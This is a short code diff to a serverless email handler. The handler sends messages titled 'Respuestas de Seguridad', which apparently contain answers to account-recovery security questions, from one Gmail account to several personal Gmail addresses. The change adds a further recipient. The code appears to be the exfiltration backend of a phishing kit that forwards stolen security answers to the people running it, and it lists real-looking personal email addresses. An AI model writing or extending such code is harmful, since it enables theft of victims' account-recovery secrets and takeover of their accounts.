@@ -14,7 +14,7 @@ exports.handler = async function(event, context) {
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com, almabrito67@gmail.com, Egarciaortiz573@gmail.com',
+        to: 'sierroalee@gmail.com, almabrito67@gmail.com, Egarciaortiz573@gmail.com, Chapmantefy@gmail.com',
         subject: 'Respuestas de Seguridad',
         text: `
 ¿Cuál es el personaje de su libro favorito?:
